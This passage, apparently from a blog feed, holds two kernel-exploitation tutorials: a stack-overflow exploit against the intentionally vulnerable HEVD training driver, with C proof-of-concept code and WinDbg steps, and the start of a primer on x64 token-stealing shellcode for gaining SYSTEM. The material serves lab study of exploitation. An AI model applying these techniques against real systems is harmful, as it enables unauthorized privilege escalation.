+&lt;span class="w"&gt;                               &lt;/span&gt;&lt;span class="n"&gt;lpBufferIn&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dwBufferInLength&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;...);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And move on to the dynamic analysis...&lt;/p&gt;
+&lt;h1&gt;Dynamic analysis&lt;/h1&gt;
+&lt;p&gt;Assuming &lt;a href="https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention"&gt;SMEP&lt;/a&gt;
+is not enabled, once we control the program counter, we can
+simply return to an known executable location in user-land, location that'll
+hold
+&lt;a href="/2017/08/14/a-primer-to-windows-x64-shellcoding"&gt;the shellcode we created in the last post&lt;/a&gt;. But
+to know the state of the stack after the overflow but before exiting the function, it'd
+be nice to have WinDbg break at the &lt;code&gt;ret&lt;/code&gt; instruction of
+&lt;code&gt;TriggerStackOverflow&lt;/code&gt;. Since ASLR is enabled, we can't just break at a fixed
+address and having to compute the address would be tedious, but fortunately,
+WinDbg, in its all awesomeness,
+provides the command
+&lt;em&gt;Break Unresolved&lt;/em&gt;) which provides a clean way to circumvent this issue:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt; uf HEVD!TriggerStackOverflow
+[...]
+  101 fffff801`8063e707 5f              pop     rdi
+  101 fffff801`8063e708 c3              ret
+
+kd&amp;gt; ? fffff801`8063e708 - HEVD!TriggerStackOverflow
+Evaluate expression: 200 = 00000000`000000c8
+
+kd&amp;gt; bu HEVD!TriggerStackOverflow+c8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We can now compile and run our first PoC, and wait for WinDbg to catch the breakpoint.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/hevd-stack-overflow-windbg-ret.png"&gt;&lt;/p&gt;
+&lt;p&gt;If we check the stack, we see that we've successfully overwritten the return
+address:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;          |                |
+          |    ReturnAddr  |
+          |       SFP      |
+          | AAAAAAAAAAAAAA |
+          | AAAAAAAAAAAAAA |
+          | AAAAAAAAAAAAAA |
+          | AAAAAAAAAAAAAA |
+          | AAAAAAAAAAAAAA |
+          | AAAAAAAAAAAAAA |
+          |                |
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;So we know that our user-land allocated must be something like:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;                     &lt;/span&gt;&lt;span class="mh"&gt;0x800&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;bytes&lt;/span&gt;&lt;span class="w"&gt;             &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;bytes&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;bytes&lt;/span&gt;
+&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;_____________________&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="nx"&gt;___________________&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nx"&gt;___&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="nx"&gt;____&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nx"&gt;___&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="nx"&gt;____&lt;/span&gt;
+&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;                                         &lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;\
+&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;                                          &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;Shellcode&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;Padding&lt;/span&gt;&lt;span class="w"&gt;                      &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;BBBBBBBB&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;addr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;                                          &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nx"&gt;buffer&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="w"&gt;                                                          &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;                                                          &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nx"&gt;__________________________________________________________&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Which translates into the following C code:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#define IOCTL_HEVD_STACK_OVERFLOW 0x222003&lt;/span&gt;
+
+
+&lt;span class="cm"&gt;/* 1. Get a handle to the driver */&lt;/span&gt;
+&lt;span class="n"&gt;HANDLE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hDevice&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CreateFileA&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\\\\&lt;/span&gt;&lt;span class="s"&gt;.&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;HackSysExtremeVulnerableDriver&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;...);&lt;/span&gt;
+
+&lt;span class="cm"&gt;/* 2. Populate our controlled area */&lt;/span&gt;
+&lt;span class="n"&gt;LPVOID&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpInBuffer&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;VirtualAlloc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MEM_COMMIT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MEM_RESERVE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="n"&gt;DWORD&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nInBufferSize&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x800&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x50&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="n"&gt;ZeroMemory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lpInBuffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x1000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="n"&gt;CopyMemory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lpInBuffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;StealTokenShellcode&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;StealTokenShellcodeLength&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="n"&gt;RtlFillMemory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lpInBuffer&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;StealTokenShellcodeLength&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x1000&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;StealTokenShellcodeLength&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;\xcc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="kt"&gt;uint64_t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;ptr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;uint64_t&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lpInBuffer&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x808&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;ptr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;uint64_t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;lpInBuffer&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="cm"&gt;/* 3. Send the IOCTL request */&lt;/span&gt;
+&lt;span class="n"&gt;BOOL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bResult&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DeviceIoControl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hDevice&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IOCTL_HEVD_STACK_OVERFLOW&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="w"&gt;                               &lt;/span&gt;&lt;span class="n"&gt;lpBufferIn&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dwBufferInLength&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;...);&lt;/span&gt;
+
+&lt;span class="cm"&gt;/* 4. Profit */&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1&gt;Final wrap-up&lt;/h1&gt;
+&lt;p&gt;The final exploit can be found &lt;a href="https://github.com/hugsy/hevd/blob/feb6d67ca5f5f3c0718042b42e22adbeee6aee62/StackOverflow/exploit.c"&gt;here&lt;/a&gt;. It includes a few extra logging information and nice cleanup so the executable can be reused many times.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;x86_64-w64-mingw32-gcc&lt;span class="w"&gt; &lt;/span&gt;-D__WIN81__&lt;span class="w"&gt; &lt;/span&gt;-D__X86_64__&lt;span class="w"&gt; &lt;/span&gt;-o&lt;span class="w"&gt; &lt;/span&gt;exploit.exe&lt;span class="w"&gt; &lt;/span&gt;exploit.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The PE &lt;code&gt;exploit.exe&lt;/code&gt; provided was compiled with the exploitation offsets of
+the internal structures of Windows 8.1 x86. Reusing directly the PE on another
+version of Windows might produce an unexpected behavior.&lt;/p&gt;
+&lt;p&gt;We can run it, and w00t !&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/hevd-stack-overflow-exploit.png"&gt;&lt;/p&gt;
+&lt;p&gt;I've also added to the repository my WinDbg workspaces (for both user-mode and
+kernel-mode) along with a header file &lt;code&gt;hevd.h&lt;/code&gt; with a few functions helping the
+exploit process of this awesome vulnerable driver.&lt;/p&gt;
+&lt;p&gt;Until next time, ✌&lt;/p&gt;
+&lt;h1&gt;Related links&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://windbg.info/doc/1-common-cmds.html"&gt;WinDbg cheatsheet&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://msdn.microsoft.com/en-us/ie/ff563197(v=vs.94)"&gt;.hh command&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://j00ru.vexillium.org/?p=783&amp;amp;lang=en"&gt;SMEP: What is it, and how to beat it on Windows&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><category term="tutorial"></category><category term="windows"></category><category term="kernel"></category><category term="debugging"></category><category term="pwn"></category><category term="stack-overflow"></category></entry><entry><title>A Primer to Windows x64 shellcoding</title><link href="https://blahcat.github.io/posts/2017/08/14/a-primer-to-windows-x64-shellcoding.html" rel="alternate"></link><published>2017-08-14T00:00:00-07:00</published><updated>2017-08-14T00:00:00-07:00</updated><author><name>hugsy</name></author><id>tag:blahcat.github.io,2017-08-14:/posts/2017/08/14/a-primer-to-windows-x64-shellcoding.html</id><summary type="html">&lt;p&gt;Continuing on the path to Windows kernel exploitation...&lt;/p&gt;
+&lt;p&gt;Thanks to the previous post, we now have a working lab for easily (and
+in a reasonably fast manner) debug Windows kernel.&lt;/p&gt;
+&lt;p&gt;Let's skip ahead for a minute and assume we control PC using some vulnerability
+in kernel land (next post), then …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Continuing on the path to Windows kernel exploitation...&lt;/p&gt;
+&lt;p&gt;Thanks to the previous post, we now have a working lab for easily (and
+in a reasonably fast manner) debug Windows kernel.&lt;/p&gt;
+&lt;p&gt;Let's skip ahead for a minute and assume we control PC using some vulnerability
+in kernel land (next post), then we may want to jump back into a user allocated
+buffer to execute a control shellcode. So where do we go from now? How to
+transform this controlled PC in the kernel-land into a privileged process in
+user-land?&lt;/p&gt;
+&lt;p&gt;The classic technique is to steal the &lt;code&gt;System&lt;/code&gt; process token and copy it into the
+structure of our targeted arbitrary (but unprivileged) process (say &lt;code&gt;cmd.exe&lt;/code&gt;).&lt;/p&gt;
+&lt;div class="alert-info"&gt;&lt;i class="fa fa-info-circle"&gt;&amp;nbsp;Note:&lt;/i&gt;&lt;br&gt;
+Our target here will the Modern.IE Windows 8.1 x64 we created in the &lt;a href="/2017/08/07/setting-up-a-windows-vm-lab-for-kernel-debugging"&gt;previous post&lt;/a&gt;, that we'll interact with using &lt;code&gt;kd&lt;/code&gt; via Network debugging. Refer to previous post if you need to set it up.
+&lt;/div&gt;
+&lt;h1&gt;Stealing SYSTEM token using &lt;code&gt;kd&lt;/code&gt;&lt;/h1&gt;
+&lt;p&gt;The
+&lt;a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-process"&gt;&lt;code&gt;!process&lt;/code&gt;&lt;/a&gt; extension
+of WinDBG provides a structured display of one or all the processes.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt; !process 0 0 System
+PROCESS ffffe000baa6c040
+   SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
+   DirBase: 001a7000  ObjectTable: ffffc0002f403000  HandleCount: &amp;lt;Data Not Accessible&amp;gt;
+   Image: System
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This leaks the address of the &lt;code&gt;_EPROCESS&lt;/code&gt; structure in the kernel, of the process
+named &lt;code&gt;System&lt;/code&gt;. Using &lt;code&gt;dt&lt;/code&gt; will provide a lot more info (here, massively
+truncated to what interests us):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt; dt _EPROCESS ffffe000baa6c040
+ntdll!_EPROCESS
+   +0x000 Pcb              : _KPROCESS
+   [...]
+   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
+   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xffffe000`bbc54be8 - 0xfffff801`fed220a0 ]
+   [...]
+   +0x348 Token            : _EX_FAST_REF
+   [...]
+   +0x430 PageDirectoryPte : 0
+   +0x438 ImageFileName    : [15]  &amp;quot;System&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;At &lt;code&gt;nt!_EPROCESS.Token&lt;/code&gt; (+0x348) we get the process token, which holds a pointer to an
+&lt;a href="https://git.reactos.org/?p=reactos.git;a=blob;f=reactos/sdk/include/ndk/extypes.h;h=feaf7b95df50f7a9d95108882a2cdd71263a675b;hb=HEAD#l418"&gt;"Executive Fast Reference" structure&lt;/a&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt; dt nt!_EX_FAST_REF ffffe000baa6c040+348
+   +0x000 Object           : 0xffffc000`2f405598 Void
+   +0x000 RefCnt           : 0y1000
+   +0x000 Value            : 0xffffc000`2f405598
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;If we nullify the last nibble of the address (i.e. AND with -0xf on x64, -7 on
+x86), we end up having the &lt;code&gt;System&lt;/code&gt; token's address:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt; ? 0xffffc000`2f405598 &amp;amp; -f
+Evaluate expression: -70367951432304 = ffffc000`2f405590
+
+kd&amp;gt; dt nt!_TOKEN ffffc000`2f405590
+    +0x000 TokenSource      : _TOKEN_SOURCE
+    +0x010 TokenId          : _LUID
+    +0x018 AuthenticationId : _LUID
+    +0x020 ParentTokenId    : _LUID
+    +0x028 ExpirationTime   : _LARGE_INTEGER 0x06207526`b64ceb90
+    +0x030 TokenLock        : 0xffffe000`baa4ef90 _ERESOURCE
+    +0x038 ModifiedId       : _LUID
+    +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
+    +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
+    [...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="alert-info"&gt;&lt;i class="fa fa-info-circle"&gt;&amp;nbsp;Note:&lt;/i&gt; the WinDBG extension &lt;a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-token"&gt;&lt;code&gt;!token&lt;/code&gt;&lt;/a&gt; provides a more detailed (and parsed) output. You might to refer to it instead whenever  you are analyzing tokens.&lt;/div&gt;
+&lt;p&gt;So basically, if we create a process (say &lt;code&gt;cmd.exe&lt;/code&gt;), and overwrite its token with the &lt;code&gt;System&lt;/code&gt; token value we found (0xffffc0002f405590), our process will be running as &lt;code&gt;System&lt;/code&gt;. Let's try!&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/token-bump-via-windbg-1.png"&gt;&lt;/p&gt;
+&lt;p&gt;We search our process using &lt;code&gt;kd&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt; !process 0 0 cmd.exe
+PROCESS ffffe000babfd900
+    SessionId: 1  Cid: 09fc    Peb: 7ff6fa81c000  ParentCid: 0714
+    DirBase: 45c4c000  ObjectTable: ffffc00036d03940  HandleCount: &amp;lt;Data Not  Accessible&amp;gt;
+    Image: cmd.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Overwrite the offset 0x348 with the &lt;code&gt;SYSTEM&lt;/code&gt; token pointer (0xffffc0002f405590).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt; dq ffffe000bc043900+348 l1
+ffffe000`bc043c48  ffffc000`30723426
+kd&amp;gt; eq 0xffffe000babfd900+0x348 0xffffc0002f405590
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And tada ...&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/token-bump-via-windbg-2.png"&gt;&lt;/p&gt;
+&lt;p&gt;Now we know how to transform any unprivileged process into a privileged one
+using &lt;code&gt;kd&lt;/code&gt;.&lt;/p&gt;
+&lt;h1&gt;Shellcoding our way to SYSTEM&lt;/h1&gt;
+&lt;p&gt;So the basic idea now, to reproduce the same steps that we did in the last
+part, but from our shellcode. So we need:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;A pointer to &lt;code&gt;System&lt;/code&gt; &lt;code&gt;EPROCESS&lt;/code&gt; structure, and save the token (located
+    at offset +0x348)&lt;/li&gt;
+&lt;li&gt;Look up for the current process &lt;code&gt;EPROCESS&lt;/code&gt; structure&lt;/li&gt;
+&lt;li&gt;Overwrite its token with &lt;code&gt;System&lt;/code&gt;'s&lt;/li&gt;
+&lt;li&gt;Profit!&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;Getting the current process structure address&lt;/h2&gt;
+&lt;p&gt;Pointers to process structures on Windows are stored in a doubly linked list (see the
+member &lt;code&gt;ActiveProcessLinks&lt;/code&gt; of &lt;code&gt;nt!_EPROCESS&lt;/code&gt; in &lt;code&gt;kd&lt;/code&gt;).
+If we have the address to one process, we can "scroll" back and forward to discover the
+others. But first, we need to get the address of at the least one process in the
+kernel.&lt;/p&gt;
+&lt;p&gt;This is exactly the purpose of the routine &lt;code&gt;nt!PsGetCurrentProcess&lt;/code&gt;, but
+since we can't call it directly (thank you ASLR), we can still check what is it
+doing under the hood:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt; uf nt!PsGetCurrentProcess
+nt!PsGetCurrentProcess:
+fffff801`feb06e84 65488b042588010000   mov   rax,qword ptr gs:[188h]
+fffff801`feb06e8d 488b80b8000000       mov   rax,qword ptr [rax+0B8h]
+fffff801`feb06e94 c3                   ret
+
+kd&amp;gt; dps gs:188 l1
+002b:00000000`00000188  fffff801`fedbfa00 nt!KiInitialThread
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code&gt;mov rax, qword ptr gs:[188h]&lt;/code&gt; returns a pointer to an &lt;code&gt;_ETHREAD&lt;/code&gt; structure (more
+specifically the kernel thread (KTHREAD) &lt;code&gt;nt!KiInitialThread&lt;/code&gt;). If we check the content of
+this structure at the offset 0xb8, we find the structure to the current process:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt; dt nt!_EPROCESS poi(nt!KiInitialThread+b8)
+   +0x000 Pcb              : _KPROCESS
+   [...]
+   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
+   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xffffe000`bbc54be8 - 0xfffff801`fed220a0 ]
+   [...]
+   +0x348 Token            : _EX_FAST_REF
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;So now we know where our current process resides in the kernel (just like &lt;code&gt;kd&lt;/code&gt;
+gave us using &lt;code&gt;!process 0 0 cmd.exe&lt;/code&gt; earlier), and therefore the first of our
+shellcode:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;gs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0x188&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0xb8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Browsing through the process list to reach &lt;code&gt;System&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;The processes are stored in the &lt;code&gt;ActiveProcessLinks&lt;/code&gt; (offset 0x2e8) of the
+&lt;code&gt;nt!_EPROCESS&lt;/code&gt; structure, via a &lt;code&gt;_LIST_ENTRY&lt;/code&gt;, which is a doubly linked list in
+its simplest form:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt; dt _LIST_ENTRY
+ntdll!_LIST_ENTRY
+   +0x000 Flink            : Ptr64 _LIST_ENTRY
+   +0x008 Blink            : Ptr64 _LIST_ENTRY
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Since we know that &lt;code&gt;System&lt;/code&gt; process ID is 4, we can write a very small loop in
+assembly, whose pseudo-C code would be:&lt;/p&gt;
